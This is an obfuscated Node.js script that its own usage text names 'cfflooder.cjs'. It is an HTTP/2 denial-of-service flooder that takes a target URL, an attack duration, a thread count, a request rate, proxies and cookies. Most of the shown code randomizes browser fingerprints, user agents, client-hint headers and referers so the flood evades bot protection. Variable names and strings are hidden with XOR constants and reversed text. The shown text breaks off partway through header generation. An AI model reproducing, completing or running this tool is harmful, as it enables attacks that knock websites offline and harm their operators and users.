var _0xc984fd;
const fs = require("fs");
_0xc984fd = (837509 ^ 837505) + (531534 ^ 531535);
var _0xa29dg = (411355 ^ 411352) + (967532 ^ 967534);
const net = require("net");
_0xa29dg = (611256 ^ 611256) + (137271 ^ 137279);
const tls = require("tls");
const HPACK = require("hpack");
var _0x78f1ff = (791539 ^ 791539) + (643695 ^ 643689);
const cluster = require("cluster");
_0x78f1ff = 591724 ^ 591717;
const crypto = require("crypto");
var _0xeb39ba = (103112 ^ 103104) + (493991 ^ 493990);
const os = require("os");
_0xeb39ba = (351318 ^ 351319) + (526968 ^ 526969);
require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
process.env.DEBUG_MODE = process.env.DEBUG_MODE || "false";
process.setMaxListeners(118471 ^ 118471);
process.on("uncaughtException", e => {
  console.log(e);
});
process.on("noitcejeRdeldnahnu".split("").reverse().join(""), e => {
  console.log(e);
});
let target;
let time;
let threads;
let ratelimit;
let proxy;
let userAgent;
let cookie;
var _0xdb_0x5f5;
let url;
_0xdb_0x5f5 = "ogcmbp";
var _0xg30bge = (813194 ^ 813198) + (757530 ^ 757529);
let proxies = [];
_0xg30bge = (405188 ^ 405191) + (185245 ^ 185241);
if (process.argv.length >= (647001 ^ 647002)) {
  target = process.argv[955438 ^ 955436];
  time = parseInt(process.argv[701861 ^ 701862], 843590 ^ 843596) || 342972 ^ 342912;
  threads = parseInt(process.argv[628002 ^ 628006], 975206 ^ 975212) || 511092 ^ 511102;
  ratelimit = parseInt(process.argv[950852 ^ 950849], 671025 ^ 671035) || 428698 ^ 428798;
  if (process.argv[737970 ^ 737972]) {
    if (process.argv[709185 ^ 709191].includes(":")) {
      proxy = process.argv[102708 ^ 102706];
      proxies = [proxy];
    } else {
      try {
        var _0x2fg;
        const proxyFile = process.argv[746454 ^ 746448];
        _0x2fg = (892908 ^ 892904) + (615534 ^ 615526);
        proxies = fs.readFileSync(proxyFile, "utf8").replace(new RegExp("\\r\\n", "g"), "\n").split("\n").filter(p => p.trim());
        if (proxies.length === (471006 ^ 471006)) {
          throw new Error("代理文件为空");
        }
        proxy = proxies[466509 ^ 466509];
      } catch (e) {
        console.log(`[!] 代理文件读取失败: ${e.message}，将使用默认代理 127.0.0.1:7897`);
        proxy = "127.0.0.1:7897";
        proxies = [proxy];
      }
    }
  } else {
    proxy = "127.0.0.1:7897";
    proxies = [proxy];
  }
  if (process.argv[184312 ^ 184319]) {
    if (process.argv[371262 ^ 371257].startsWith("@")) {
      try {
        const cookieFile = process.argv[564843 ^ 564844].substring(415972 ^ 415973);
        cookie = fs.readFileSync(cookieFile, "utf8").trim();
        console.log(`[+] 从文件 ${cookieFile} 读取Cookie成功`);
      } catch (e) {
        console.log(`[!] 从文件读取Cookie失败: ${e.message}`);
        cookie = process.argv[116570 ^ 116573];
      }
    } else {
      cookie = process.argv[316792 ^ 316799];
    }
  } else {
    cookie = "";
  }
  if (process.argv[839472 ^ 839480]) {
    if (process.argv[500275 ^ 500283].startsWith("@")) {
      try {
        var _0xc7fbcb = (719427 ^ 719435) + (422055 ^ 422054);
        const uaFile = process.argv[334542 ^ 334534].substring(191043 ^ 191042);
        _0xc7fbcb = (884398 ^ 884395) + (924666 ^ 924667);
        userAgent = fs.readFileSync(uaFile, "utf8").trim();
        console.log(`[+] 从文件 ${uaFile} 读取UserAgent成功`);
      } catch (e) {
        console.log(`[!] 从文件读取UserAgent失败: ${e.message}`);
        userAgent = process.argv[641707 ^ 641699];
      }
    } else {
      userAgent = process.argv[166226 ^ 166234];
    }
  } else {
    userAgent = "";
  }
  if (process.env.DEBUG_MODE === "eurt".split("").reverse().join("") || process.argv.includes("--debug")) {
    process.env.DEBUG_MODE = "true";
    console.log(":息信数参 ]GUBED[".split("").reverse().join(""));
    console.log(`[DEBUG] URL: ${target}`);
    console.log(`[DEBUG] 时间: ${time}秒`);
    console.log(`[DEBUG] 线程: ${threads}`);
    console.log(`[DEBUG] 速率: ${ratelimit}`);
    console.log(`[DEBUG] 代理: ${proxy || (proxies ? proxies.length + "个代理" : "无")}`);
    console.log(`[DEBUG] Cookie: ${cookie ? cookie.length > (847951 ^ 847953) ? cookie.substring(990819 ^ 990819, 709509 ^ 709531) + "...".split("").reverse().join("") : cookie : "无"}`);
    console.log(`[DEBUG] UserAgent: ${userAgent ? userAgent.length > (736307 ^ 736301) ? userAgent.substring(816502 ^ 816502, 207601 ^ 207599) + "..." : userAgent : "无"}`);
  }
  var _0x9d79b = (213724 ^ 213724) + (414635 ^ 414632);
  const debugArg = process.argv.find(arg => arg === "gubed--".split("").reverse().join(""));
  _0x9d79b = "dcckcq".split("").reverse().join("");
  if (debugArg) {
    process.env.DEBUG_MODE = "eurt".split("").reverse().join("");
    console.log("[+] 调试模式已启用，将显示详细输出");
  }
} else {
  console.log("[!] 参数不足，请使用以下格式:");
  console.log("node cfflooder.cjs [url] [time] [threads] [rate] [proxy] [cookie] [userAgent] [--debug]");
  console.log("");
  console.log(":明说数参".split("").reverse().join(""));
  console.log("/moc.elpmaxe//:sptth 如例，LRU标目 -       ]lru[  ".split("").reverse().join(""));
  console.log("  [time]      - 攻击持续时间(秒)");
  console.log("  [threads]   - 线程数量");
  console.log("  [rate]      - 每个线程的请求速率");
  console.log("  [proxy]     - 代理服务器(host:port)或代理列表文件路径");
  console.log(")txt.eikooc@(径路件文eikooC的头开@以或串符字eikooC -    ]eikooc[  ".split("").reverse().join(""));
  console.log(")txt.au@(径路件文tnegAresU的头开@以或串符字tnegAresU - ]tnegAresu[  ".split("").reverse().join(""));
  console.log("式模试调用启，选可 -   ]gubed--[  ".split("").reverse().join(""));
  console.log("");
  console.log(":例示xuniL".split("").reverse().join(""));
  console.log("  1. 将Cookie保存到文件:");
  console.log("txt.eikooc > \"2eulav=2eikooc ;1eulav=1eikooc\" ohce     ".split("").reverse().join(""));
  console.log(":件文到存保tnegAresU将 .2  ".split("").reverse().join(""));
  console.log("txt.au > \"63.735/irafaS 0.0.0.021/emorhC )okceG ekil ,LMTHK( 63.735/tiKbeWelppA )46x ;46niW ;0.01 TN swodniW( 0.5/allizoM\" ohce     ".split("").reverse().join(""));
  console.log(":件文到存保理代个多将 .3  ".split("").reverse().join(""));
  console.log("     echo \"127.0.0.1:7897\\n192.168.1.1:8080\" > proxies.txt");
  console.log("  4. 运行攻击 (使用文件中的Cookie和UserAgent):");
  console.log("txt.au@ txt.eikooc@ 7987:1.0.0.721 001 01 06 /moc.elpmaxe//:sptth sjc.redoolffc edon     ".split("").reverse().join(""));
  console.log(":)件文理代用使( 击攻行运 .5  ".split("").reverse().join(""));
  console.log("     node cfflooder.cjs https://example.com/ 60 10 100 proxies.txt @cookie.txt @ua.txt");
  console.log(":符字殊特裹包号引单用使 .6  ".split("").reverse().join(""));
  console.log("')46x ;46niW ;0.01 TN swodniW( 0.5/allizoM' '2eulav=2eikooc ;1eulav=1eikooc' 7987:1.0.0.721 001 01 06 /moc.elpmaxe//:sptth sjc.redoolffc edon     ".split("").reverse().join(""));
  process.exit(357418 ^ 357419);
}
if (!Array.isArray(proxies) || proxies.length === (751264 ^ 751264)) {
  console.log("[!] 代理数组无效，将使用默认代理 127.0.0.1:7897");
  proxies = ["7987:1.0.0.721".split("").reverse().join("")];
}
if (process.env.DEBUG_MODE === "true") {
  console.log(`[DEBUG] 使用代理: ${proxies.length > (591833 ^ 591832) ? proxies.length + "理代个".split("").reverse().join("") : proxies[757932 ^ 757932]}`);
}
try {
  url = new URL(target);
} catch (e) {
  console.log(":LRU的效无 ]![".split("").reverse().join(""), target);
  process.exit(391033 ^ 391032);
}
const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
var _0x4dfeaa = (823849 ^ 823850) + (749715 ^ 749723);
const staticUAs = process.argv[629632 ^ 629641] ? fs.readFileSync(process.argv[951975 ^ 951982], "utf8").replace(new RegExp("\\r\\n", "g"), "\n").split("\n").filter(ua => ua.trim()) : [];
_0x4dfeaa = "ncoeik";
function generateRandomString(length, _0x94c8cc, _0x3_0x5a7) {
  _0x94c8cc = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  var _0x0b1a = (774199 ^ 774206) + (517384 ^ 517387);
  _0x3_0x5a7 = "";
  _0x0b1a = "lhcmpn";
  for (let i = 176500 ^ 176500; i < length; i++) {
    _0x3_0x5a7 += _0x94c8cc.charAt(Math.floor(Math.random() * _0x94c8cc.length));
  }
  return _0x3_0x5a7;
}
function generateRandomNumber(min, max) {
  return Math.floor(Math.random() * (max - min + (853927 ^ 853926))) + min;
}
let chr = 838968 ^ 839004;
var _0xd_0xfa6 = (910095 ^ 910090) + (892608 ^ 892614);
let chr_2 = 936136 ^ 936109;
_0xd_0xfa6 = (795112 ^ 795112) + (650401 ^ 650403);
let minifix = false;
// TOLOOK
setInterval(() => {
  chr = generateRandomNumber(416711 ^ 416675, 340364 ^ 340235);
  chr_2 = generateRandomNumber(973853 ^ 973945, 722217 ^ 722350);
  minifix = !minifix;
}, 156344 ^ 155984);
function generateBrowserState() {
  const _0x7d4gd = {
    chrome: {
      versions: ["100.0.4896.127", "76.1594.0.101".split("").reverse().join(""), "511.5005.0.201".split("").reverse().join(""), "431.0605.0.301".split("").reverse().join(""), "104.0.5112.102"],
      platforms: ["Windows NT 10.0; Win64; x64", "46x ;46niW ;1.6 TN swodniW".split("").reverse().join(""), "Macintosh; Intel Mac OS X 10_15_7", "46_68x xuniL ;11X".split("").reverse().join(""), "X11; Ubuntu; Linux x86_64"],
      acceptLanguages: ["en-US,en;q=0.9", "en-GB,en;q=0.8", "9.0=q;ne,AC-ne".split("").reverse().join(""), "en-AU,en;q=0.9", "en-NZ,en;q=0.9"],
      secChUa: ["\"Google Chrome\";v=\"100\", \"Chromium\";v=\"100\", \"Not=A?Brand\";v=\"99\"", "\"Google Chrome\";v=\"101\", \"Chromium\";v=\"101\", \"Not=A?Brand\";v=\"99\"", "\"99\"=v;\"dnarB?A=toN\" ,\"201\"=v;\"muimorhC\" ,\"201\"=v;\"emorhC elgooG\"".split("").reverse().join("")]
    },
    firefox: {
      versions: ["0.001".split("").reverse().join(""), "101.0", "102.0", "103.0", "104.0"],
      platforms: ["46x ;46niW ;0.01 TN swodniW".split("").reverse().join(""), "46x ;46niW ;1.6 TN swodniW".split("").reverse().join(""), "Macintosh; Intel Mac OS X 10.15", "X11; Linux x86_64", "46_68x xuniL ;utnubU ;11X".split("").reverse().join("")],
      acceptLanguages: ["en-US,en;q=0.5", "5.0=q;ne,BG-ne".split("").reverse().join(""), "en-CA,en;q=0.5", "en-AU,en;q=0.5", "en-NZ,en;q=0.5"],
      secChUa: ["\"001\"=v;\"xoferiF\"".split("").reverse().join(""), "\"Firefox\";v=\"101\"", "\"201\"=v;\"xoferiF\"".split("").reverse().join("")]
    },
    edge: {
      versions: ["100.0.1185.44", "74.0121.0.101".split("").reverse().join(""), "102.0.1245.44", "84.4621.0.301".split("").reverse().join(""), "45.3921.0.401".split("").reverse().join("")],
      platforms: ["Windows NT 10.0; Win64; x64", "Windows NT 6.1; Win64; x64", "Macintosh; Intel Mac OS X 10_15_7", "X11; Linux x86_64"],
      acceptLanguages: ["en-US,en;q=0.9", "8.0=q;ne,BG-ne".split("").reverse().join(""), "9.0=q;ne,AC-ne".split("").reverse().join(""), "9.0=q;ne,UA-ne".split("").reverse().join(""), "9.0=q;ne,ZN-ne".split("").reverse().join("")],
      secChUa: ["\"Microsoft Edge\";v=\"100\", \"Chromium\";v=\"100\", \"Not=A?Brand\";v=\"99\"", "\"Microsoft Edge\";v=\"101\", \"Chromium\";v=\"101\", \"Not=A?Brand\";v=\"99\"", "\"Microsoft Edge\";v=\"102\", \"Chromium\";v=\"102\", \"Not=A?Brand\";v=\"99\""]
    },
    safari: {
      versions: ["5.51".split("").reverse().join(""), "6.51".split("").reverse().join(""), "16.0", "16.1", "16.2"],
      platforms: ["7_51_01 X SO caM letnI ;hsotnicaM".split("").reverse().join(""), "Macintosh; Intel Mac OS X 11_6_7", "Macintosh; Intel Mac OS X 12_5_1", "Macintosh; Intel Mac OS X 13_0_1"],
      acceptLanguages: ["9.0=q;ne,SU-ne".split("").reverse().join(""), "8.0=q;ne,BG-ne".split("").reverse().join(""), "9.0=q;ne,AC-ne".split("").reverse().join(""), "en-AU,en;q=0.9", "en-NZ,en;q=0.9"],
      secChUa: ["\"Safari\";v=\"15.5\"", "\"Safari\";v=\"15.6\"", "\"0.61\"=v;\"irafaS\"".split("").reverse().join("")]
    }
  };
  const _0x218c9a = ["chrome", "xoferif".split("").reverse().join(""), "edge", "safari"];
  var _0xbga8d;
  const _0xa209d = _0x218c9a[Math.floor(Math.random() * _0x218c9a.length)];
  _0xbga8d = "kfileb";
  var _0xbf_0x5f5 = (902584 ^ 902591) + (926141 ^ 926137);
  const _0xac9a4b = _0x7d4gd[_0xa209d];
  _0xbf_0x5f5 = "qlcdol".split("").reverse().join("");
  const _0xe94eaa = _0xac9a4b.versions[Math.floor(Math.random() * _0xac9a4b.versions.length)];
  const _0x25af5f = _0xac9a4b.platforms[Math.floor(Math.random() * _0xac9a4b.platforms.length)];
  var _0x15f5fb;
  const _0xfbc12c = _0xac9a4b.acceptLanguages[Math.floor(Math.random() * _0xac9a4b.acceptLanguages.length)];
  _0x15f5fb = (975858 ^ 975861) + (214852 ^ 214851);
  const _0x7e6bfa = _0xac9a4b.secChUa[Math.floor(Math.random() * _0xac9a4b.secChUa.length)];
  const _0xa_0x4d6 = [{
    width: 1920,
    height: 1080
  }, {
    width: 1366,
    height: 768
  }, {
    width: 1536,
    height: 864
  }, {
    width: 1440,
    height: 900
  }, {
    width: 1280,
    height: 720
  }, {
    width: 2560,
    height: 1440
  }, {
    width: 3840,
    height: 2160
  }];
  var _0x7db6ff = (571220 ^ 571222) + (558910 ^ 558908);
  const _0xbdd69d = _0xa_0x4d6[Math.floor(Math.random() * _0xa_0x4d6.length)];
  _0x7db6ff = "epmpna";
  const _0x8641da = [452335 ^ 452343, 502219 ^ 502229, 786576 ^ 786592];
  var _0xgc_0xc24 = (812837 ^ 812838) + (436333 ^ 436335);
  const _0x35gefc = _0x8641da[Math.floor(Math.random() * _0x8641da.length)];
  _0xgc_0xc24 = (218877 ^ 218876) + (441460 ^ 441468);
  const _0x57ce3a = ["kroY_weN/aciremA".split("").reverse().join(""), "America/Los_Angeles", "nodnoL/eporuE".split("").reverse().join(""), "siraP/eporuE".split("").reverse().join(""), "Asia/Tokyo", "iahgnahS/aisA".split("").reverse().join(""), "yendyS/ailartsuA".split("").reverse().join("")];
  var _0xa3232b = (375348 ^ 375350) + (314942 ^ 314941);
  const _0x3c2b = _0x57ce3a[Math.floor(Math.random() * _0x57ce3a.length)];
  _0xa3232b = 652849 ^ 652851;
  const _0x19d = ["en-US", "en-GB", "fr-FR", "de-DE", "es-ES", "it-IT", "pt-BR", "ru-RU", "ja-JP", "zh-CN", "ko-KR"];
  var _0xdd_0x696;
  const _0xf7d = _0x19d[Math.floor(Math.random() * _0x19d.length)];
  _0xdd_0x696 = (704813 ^ 704814) + (954335 ^ 954330);
  const _0x02eg0a = Math.pow(126103 ^ 126101, Math.floor(Math.random() * (571963 ^ 571967)) + (944179 ^ 944177));
  const _0xc71f = Math.pow(481419 ^ 481417, Math.floor(Math.random() * (331674 ^ 331678)) + (825384 ^ 825386));
  var _0xf2a1f;
  const _0xg4ea6b = ["Google Inc.", "Intel Inc.", "NVIDIA Corporation", "AMD", "Apple Inc."];
  _0xf2a1f = 106490 ^ 106488;
  const _0x7cgd2g = ["ANGLE (Intel, Intel(R) UHD Graphics Direct3D11 vs_5_0 ps_5_0)", "ANGLE (NVIDIA, NVIDIA GeForce GTX 1060 Direct3D11 vs_5_0 ps_5_0)", "ANGLE (AMD, AMD Radeon RX 580 Direct3D11 vs_5_0 ps_5_0)", "ANGLE (Intel, Intel(R) HD Graphics 620 Direct3D11 vs_5_0 ps_5_0)", ")0_5_sp 0_5_sv 11D3tceriD 0803 XTR ecroFeG AIDIVN ,AIDIVN( ELGNA".split("").reverse().join("")];
  var _0x23e9c = (354732 ^ 354733) + (599385 ^ 599389);
  const _0xc3aa = _0xg4ea6b[Math.floor(Math.random() * _0xg4ea6b.length)];
  _0x23e9c = 669290 ^ 669293;
  const _0xd2_0xe4f = _0x7cgd2g[Math.floor(Math.random() * _0x7cgd2g.length)];
  var _0xecb4b = (677245 ^ 677236) + (541767 ^ 541763);
  const _0x29ac = ["PDF Viewer", "Chrome PDF Viewer", "Chromium PDF Viewer", "Microsoft Edge PDF Viewer", "WebKit built-in PDF", "Native Client"];
  _0xecb4b = 354907 ^ 354908;
  var _0x1a325f = (626306 ^ 626315) + (663391 ^ 663385);
  const _0xa8a1b = _0x29ac.sort(() => Math.random() - 0.5).slice(285154 ^ 285154, Math.floor(Math.random() * (189756 ^ 189759)) + (478770 ^ 478771));
  _0x1a325f = (475050 ^ 475048) + (223968 ^ 223968);
  return {
    browser: _0xa209d,
    version: _0xe94eaa,
    platform: _0x25af5f,
    acceptLanguage: _0xfbc12c,
    secChUa: _0x7e6bfa,
    screen: _0xbdd69d,
    colorDepth: _0x35gefc,
    timezone: _0x3c2b,
    language: _0xf7d,
    hardwareConcurrency: _0x02eg0a,
    deviceMemory: _0xc71f,
    webglVendor: _0xc3aa,
    webglRenderer: _0xd2_0xe4f,
    plugins: _0xa8a1b
  };
}
function generateBrowserBehavior() {
  const _0xc34e = [{
    width: 1920,
    height: 1080
  }, {
    width: 1366,
    height: 768
  }, {
    width: 1536,
    height: 864
  }, {
    width: 1440,
    height: 900
  }, {
    width: 1280,
    height: 720
  }, {
    width: 2560,
    height: 1440
  }, {
    width: 3840,
    height: 2160
  }];
  var _0x7b5eb = (388450 ^ 388455) + (885852 ^ 885845);
  const _0xee955c = _0xc34e[Math.floor(Math.random() * _0xc34e.length)];
  _0x7b5eb = (789131 ^ 789133) + (879411 ^ 879419);
  const _0x43099g = [265998 ^ 266006, 419077 ^ 419099, 413538 ^ 413522];
  const _0x39dbc = _0x43099g[Math.floor(Math.random() * _0x43099g.length)];
  var _0x9a_0xd2b;
  const _0xb8d = ["America/New_York", "America/Los_Angeles", "Europe/London", "Europe/Paris", "oykoT/aisA".split("").reverse().join(""), "Asia/Shanghai", "yendyS/ailartsuA".split("").reverse().join("")];
  _0x9a_0xd2b = 683733 ^ 683733;
  var _0x1f_0x15f = (723533 ^ 723530) + (837395 ^ 837393);
  const _0x38bf = _0xb8d[Math.floor(Math.random() * _0xb8d.length)];
  _0x1f_0x15f = 640244 ^ 640246;
  const _0x13682e = ["en-US", "en-GB", "fr-FR", "de-DE", "SE-se".split("").reverse().join(""), "it-IT", "pt-BR", "ru-RU", "ja-JP", "NC-hz".split("").reverse().join(""), "RK-ok".split("").reverse().join("")];
  const _0x1dbacg = _0x13682e[Math.floor(Math.random() * _0x13682e.length)];
  var _0xb5c46f = (811210 ^ 811215) + (433194 ^ 433199);
  const _0xgca41e = Math.pow(771626 ^ 771624, Math.floor(Math.random() * (992988 ^ 992984)) + (511209 ^ 511211));
  _0xb5c46f = 100045 ^ 100043;
  var _0x7f7a = (251254 ^ 251251) + (806177 ^ 806178);
  const _0x85f13b = Math.pow(287241 ^ 287243, Math.floor(Math.random() * (291406 ^ 291402)) + (703557 ^ 703559));
  _0x7f7a = 250583 ^ 250582;
  var _0x_0xg6d;
  const _0x886a = ["Google Inc.", "Intel Inc.", "NVIDIA Corporation", "DMA".split("").reverse().join(""), "Apple Inc."];
  _0x_0xg6d = 670616 ^ 670619;
  const _0xg_0xec4 = [")0_5_sp 0_5_sv 11D3tceriD scihparG DHU )R(letnI ,letnI( ELGNA".split("").reverse().join(""), ")0_5_sp 0_5_sv 11D3tceriD 0601 XTG ecroFeG AIDIVN ,AIDIVN( ELGNA".split("").reverse().join(""), "ANGLE (AMD, AMD Radeon RX 580 Direct3D11 vs_5_0 ps_5_0)", "ANGLE (Intel, Intel(R) HD Graphics 620 Direct3D11 vs_5_0 ps_5_0)", "ANGLE (NVIDIA, NVIDIA GeForce RTX 3080 Direct3D11 vs_5_0 ps_5_0)"];
  var _0x4f_0x6fa = (465211 ^ 465211) + (764965 ^ 764962);
  const _0x36347f = _0x886a[Math.floor(Math.random() * _0x886a.length)];
  _0x4f_0x6fa = "dkkipf".split("").reverse().join("");
  var _0x5dfe1e;
  const _0xf3g7eb = _0xg_0xec4[Math.floor(Math.random() * _0xg_0xec4.length)];
  _0x5dfe1e = "npjfep".split("").reverse().join("");
  const _0x77c2dd = ["reweiV FDP".split("").reverse().join(""), "Chrome PDF Viewer", "reweiV FDP muimorhC".split("").reverse().join(""), "reweiV FDP egdE tfosorciM".split("").reverse().join(""), "FDP ni-tliub tiKbeW".split("").reverse().join(""), "Native Client"];
  var _0x76da0b;
  const _0x84d8d = _0x77c2dd.sort(() => Math.random() - 0.5).slice(893243 ^ 893243, Math.floor(Math.random() * (770790 ^ 770789)) + (144612 ^ 144613));
  _0x76da0b = (962356 ^ 962354) + (529854 ^ 529846);
  var _0x89fe2f = (300052 ^ 300054) + (464808 ^ 464814);
  const _0xd50e = {
    screen: _0xee955c,
    colorDepth: _0x39dbc,
    timezone: _0x38bf,
    language: _0x1dbacg,
    hardwareConcurrency: _0xgca41e,
    deviceMemory: _0x85f13b,
    webglVendor: _0x36347f,
    webglRenderer: _0xf3g7eb,
    plugins: _0x84d8d,
    doNotTrack: Math.random() < 0.3 ? "1" : "0",
    cookieEnabled: Math.random() < 0.9,
    javaEnabled: Math.random() < 0.2,
    online: Math.random() < 0.95,
    performance: {
      timing: {
        navigationStart: Date.now() - Math.floor(Math.random() * 3600000),
        loadEventEnd: Date.now() - Math.floor(Math.random() * (331727 ^ 330791))
      }
    }
  };
  _0x89fe2f = (148833 ^ 148832) + (423615 ^ 423606);
  return _0xd50e;
}
function generateHeaders(url, streamId, type, statuses, version, customUserAgent, customCookie) {
  var _0xc973b = (642137 ^ 642141) + (441377 ^ 441379);
  const _0xe2_0xc4g = generateRandomString(751608 ^ 751602);
  _0xc973b = "nbccfm";
  let _0x616fc = url.pathname;
  var _0xdb19ec;
  const _0x41c54c = {};
  _0xdb19ec = 491745 ^ 491752;
  if (process.env.DEBUG_MODE === "true") {
    console.log(`[DEBUG] generateHeaders: 使用全局cookie=${cookie ? "yes" : "on".split("").reverse().join("")}, userAgent=${userAgent ? "yes" : "no"}`);
  }
  var _0xfd7ee;
  const _0xe2e7fg = {
    chrome: {
      versions: ["721.6984.0.001".split("").reverse().join(""), "76.1594.0.101".split("").reverse().join(""), "511.5005.0.201".split("").reverse().join(""), "103.0.5060.134", "201.2115.0.401".split("").reverse().join("")],
      platforms: ["Windows NT 10.0; Win64; x64", "Windows NT 6.1; Win64; x64", "7_51_01 X SO caM letnI ;hsotnicaM".split("").reverse().join(""), "46_68x xuniL ;11X".split("").reverse().join(""), "X11; Ubuntu; Linux x86_64"],
      acceptLanguages: ["en-US,en;q=0.9", "8.0=q;ne,BG-ne".split("").reverse().join(""), "en-CA,en;q=0.9,fr-CA;q=0.8", "9.0=q;ne,UA-ne".split("").reverse().join(""), "en-NZ,en;q=0.9"],
      secChUa: ["\"99\"=v;\"dnarB?A=toN\" ,\"001\"=v;\"muimorhC\" ,\"001\"=v;\"emorhC elgooG\"".split("").reverse().join(""), "\"Google Chrome\";v=\"101\", \"Chromium\";v=\"101\", \"Not=A?Brand\";v=\"99\"", "\"99\"=v;\"dnarB?A=toN\" ,\"201\"=v;\"muimorhC\" ,\"201\"=v;\"emorhC elgooG\"".split("").reverse().join("")]
    },
    firefox: {
      versions: ["0.001".split("").reverse().join(""), "0.101".split("").reverse().join(""), "0.201".split("").reverse().join(""), "0.301".split("").reverse().join(""), "104.0"],
      platforms: ["Windows NT 10.0; Win64; x64", "Windows NT 6.1; Win64; x64", "Macintosh; Intel Mac OS X 10.15", "X11; Linux x86_64", "46_68x xuniL ;utnubU ;11X".split("").reverse().join("")],
      acceptLanguages: ["en-US,en;q=0.5", "5.0=q;ne,BG-ne".split("").reverse().join(""), "en-CA,en;q=0.5", "5.0=q;ne,UA-ne".split("").reverse().join(""), "en-NZ,en;q=0.5"],
      secChUa: ["\"Firefox\";v=\"100\"", "\"Firefox\";v=\"101\"", "\"Firefox\";v=\"102\""]
    },
    edge: {
      versions: ["44.5811.0.001".split("").reverse().join(""), "101.0.1210.47", "102.0.1245.44", "103.0.1264.48", "45.3921.0.401".split("").reverse().join("")],
      platforms: ["Windows NT 10.0; Win64; x64", "Windows NT 6.1; Win64; x64", "7_51_01 X SO caM letnI ;hsotnicaM".split("").reverse().join(""), "46_68x xuniL ;11X".split("").reverse().join("")],
      acceptLanguages: ["en-US,en;q=0.9", "8.0=q;ne,BG-ne".split("").reverse().join(""), "9.0=q;ne,AC-ne".split("").reverse().join(""), "en-AU,en;q=0.9", "9.0=q;ne,ZN-ne".split("").reverse().join("")],
      secChUa: ["\"Microsoft Edge\";v=\"100\", \"Chromium\";v=\"100\", \"Not=A?Brand\";v=\"99\"", "\"Microsoft Edge\";v=\"101\", \"Chromium\";v=\"101\", \"Not=A?Brand\";v=\"99\"", "\"99\"=v;\"dnarB?A=toN\" ,\"201\"=v;\"muimorhC\" ,\"201\"=v;\"egdE tfosorciM\"".split("").reverse().join("")]
    },
    safari: {
      versions: ["15.5", "15.6", "16.0", "1.61".split("").reverse().join(""), "16.2"],
      platforms: ["Macintosh; Intel Mac OS X 10_15_7", "Macintosh; Intel Mac OS X 11_6_7", "1_5_21 X SO caM letnI ;hsotnicaM".split("").reverse().join(""), "1_0_31 X SO caM letnI ;hsotnicaM".split("").reverse().join("")],
      acceptLanguages: ["9.0=q;ne,SU-ne".split("").reverse().join(""), "en-GB,en;q=0.8", "en-CA,en;q=0.9", "en-AU,en;q=0.9", "9.0=q;ne,ZN-ne".split("").reverse().join("")],
      secChUa: ["\"Safari\";v=\"15.5\"", "\"6.51\"=v;\"irafaS\"".split("").reverse().join(""), "\"0.61\"=v;\"irafaS\"".split("").reverse().join("")]
    }
  };
  _0xfd7ee = (600914 ^ 600914) + (513705 ^ 513708);
  var _0x73514g = (909471 ^ 909469) + (597514 ^ 597516);
  const _0xc192fe = ["chrome", "firefox", "egde".split("").reverse().join(""), "safari"];
  _0x73514g = 652583 ^ 652582;
  const _0xf86ba = _0xc192fe[Math.floor(Math.random() * _0xc192fe.length)];
  const _0xe4a = _0xe2e7fg[_0xf86ba];
  const _0x13g = _0xe4a.versions[Math.floor(Math.random() * _0xe4a.versions.length)];
  const _0xca_0x529 = _0xe4a.platforms[Math.floor(Math.random() * _0xe4a.platforms.length)];
  const _0x352b = _0xe4a.acceptLanguages[Math.floor(Math.random() * _0xe4a.acceptLanguages.length)];
  const _0x1936cb = _0xe4a.secChUa[Math.floor(Math.random() * _0xe4a.secChUa.length)];
  const _0x77a3ge = generateBrowserBehavior();
  if (streamId === (707544 ^ 707545)) {
    _0x41c54c.pragma = "no-cache";
    _0x41c54c["cache-control"] = "no-cache";
  }
  _0x41c54c["sec-ch-ua"] = _0x1936cb;
  _0x41c54c["sec-ch-ua-mobile"] = _0xca_0x529.includes("Mobile") ? "?1" : "?0";
  _0x41c54c["sec-ch-ua-platform"] = _0xca_0x529;
  _0x41c54c["upgrade-insecure-requests"] = "1";
  var _0x1d1agd = (779857 ^ 779857) + (752074 ^ 752072);
  const _0x2c_0x7e1 = customUserAgent || userAgent || `Mozilla/5.0 (${_0xca_0x529}) AppleWebKit/537.36 (KHTML, like Gecko) ${_0xf86ba === "chrome" ? "emorhC".split("").reverse().join("") : _0xf86ba === "xoferif".split("").reverse().join("") ? "xoferiF".split("").reverse().join("") : _0xf86ba === "edge" ? "Edg" : "irafaS".split("").reverse().join("")}/${_0x13g}`;
  _0x1d1agd = (935126 ^ 935123) + (139038 ^ 139035);
  _0x41c54c["user-agent"] = _0x2c_0x7e1;
  if (process.env.DEBUG_MODE === "true") {
    console.log(`[DEBUG] 使用UserAgent: ${_0x2c_0x7e1.substring(345207 ^ 345207, 418168 ^ 418122)}...`);
  }
  _0x41c54c.accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
  _0x41c54c["sec-fetch-site"] = "same-origin";
  _0x41c54c["sec-fetch-mode"] = "navigate";
  _0x41c54c["sec-fetch-user"] = "1?".split("").reverse().join("");
  _0x41c54c["sec-fetch-dest"] = "tnemucod".split("").reverse().join("");
  _0x41c54c["accept-encoding"] = "rb ,etalfed ,pizg".split("").reverse().join("");
  _0x41c54c["accept-language"] = _0x352b;
  _0x41c54c.priority = "i ,0=u".split("").reverse().join("");
  var _0x5b8d = (332268 ^ 332264) + (110796 ^ 110788);
  const _0x7e_0xb28 = ["google.com", "bing.com", "yahoo.com", "facebook.com", "twitter.com", "reddit.com", "moc.nideknil".split("").reverse().join(""), "instagram.com"];
  _0x5b8d = (843889 ^ 843894) + (610753 ^ 610752);
  var _0x272dcc = (516322 ^ 516326) + (632416 ^ 632425);
  const _0x3bdeba = _0x7e_0xb28[Math.floor(Math.random() * _0x7e_0xb28.length)];
  _0x272dcc = (867645 ^ 867644) + (824708 ^ 824717);
  _0x41c54c.referer = `https://${_0x3bdeba}/`;
  const _0xd84fb = customCookie || cookie;
  if (_0xd84fb) {
    _0x41c54c.cookie = _0xd84fb;
    if (process.env.DEBUG_MODE === "true") {
      console.log(`[DEBUG] 使用Cookie: ${_0xd84fb.substring(255987 ^ 255987, 641898 ^ 641880)}${_0xd84fb.length > (448550 ^ 448532) ? "..." : ""}`);
    }
  }
  if (_0x77a3ge.doNotTrack === "1") {
    _0x41c54c.dnt = "1";
  }
